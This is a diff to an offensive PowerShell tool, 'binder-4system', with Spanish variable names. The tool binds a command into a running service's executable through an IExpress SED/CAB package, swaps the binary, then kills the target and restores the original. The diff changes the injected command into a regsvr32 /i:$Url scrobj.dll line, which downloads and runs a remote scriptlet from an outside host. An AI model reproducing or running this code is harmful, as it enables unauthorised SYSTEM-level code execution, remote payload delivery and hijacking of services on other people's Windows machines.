@@ -1,5 +1,5 @@
 function binder-4system {
-param ([string]$procID,[string]$command_execute)
+param ([string]$procID,[string]$Url)
 
 $process_target =  Get-Process -id $procid
 $nombre_objetivo =  $process
@@ -8,6 +8,7 @@ $process_name = $process_target.Name
 $path_process =  ($process_target | Select-Object -Property *).path
 $pid_target = $process_target.Id
 $service_name = (Get-WmiObject Win32_Service -Filter "ProcessId='$($procID)'").name
+$url = "regsvr32.exe /s /n /u /i:$Url scrobj.dll"
 
 if ($nombre_objetivo,$process_target,$path_process,$pid_target,$service_name -eq $null ) {write-host "Script Error."; break} else {
 write-host 
@@ -80,7 +81,7 @@ Set-Location $ruta
 $sed = $sed -replace "objetivo", "$nombre_objetivo"
 $sed = $sed -replace "nombre_final", "$ruta$nombre_final"
 $sed = $sed -replace "ruta_archivo", "$ruta"
-$sed = $sed -replace "ejecuta_comando", "$command_execute"
+$sed = $sed -replace "ejecuta_comando", "$Url"
 $sed = $sed -replace "solo_nombre_archivo", "$nombre_objetivo"
 if ([int]$archivo_sed.count -gt 1) {$archivo_sed = $archivo_sed[0] + "_" + $archivo_sed[1]}
 $sed > $archivo_sed
@@ -117,7 +118,7 @@ $get_process = Get-Process -Name $process_name ; foreach ($killprocess in $get_p
 if (($killprocess | Select-Object -Property *).description -like "*CAB*"){ $killprocess | Stop-Process -Force}
 
 }
-
+taskkill /f /im $nombre_objetivo
 Copy-Item $nombre_objetivo_bkp $nombre_objetivo 
 Remove-Item $archivo_sed
 Remove-Item $nombre_final
